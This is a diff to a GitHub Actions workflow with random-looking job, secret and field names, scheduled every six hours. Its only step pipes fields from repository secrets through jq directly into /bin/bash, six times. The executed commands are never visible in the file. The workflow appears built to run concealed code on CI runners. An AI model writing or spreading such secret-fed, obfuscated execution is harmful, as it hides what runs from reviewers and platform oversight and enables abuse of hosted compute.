@@ -1,20 +1,22 @@
 name: zhuzhuanyun3987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
+    - cron: '6 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhuzhuanyun3987
         env:
-          qc86: ${{ secrets.qc86 }}
+          qc8130: ${{ secrets.qc8130 }}
         run: |
-          echo $qc86 | jq -r .bxrf2 | /bin/bash
-          echo $p216 | jq -r .q58 | /bin/bash
-          echo $sn57174 | jq -r .mt40 | /bin/bash
-          echo $uklnv3617 | jq -r .xglcm544 | /bin/bash
+          echo $qc8130 | jq -r .sym5607 | /bin/bash
+          echo $hmg98 | jq -r .yf65930 | /bin/bash
+          echo $fpnex78 | jq -r .qq6582 | /bin/bash
+          echo $x61662 | jq -r .ggt18934 | /bin/bash
+          echo $bsej62 | jq -r .i466 | /bin/bash
+          echo $j4 | jq -r .gk5539 | /bin/bash
 
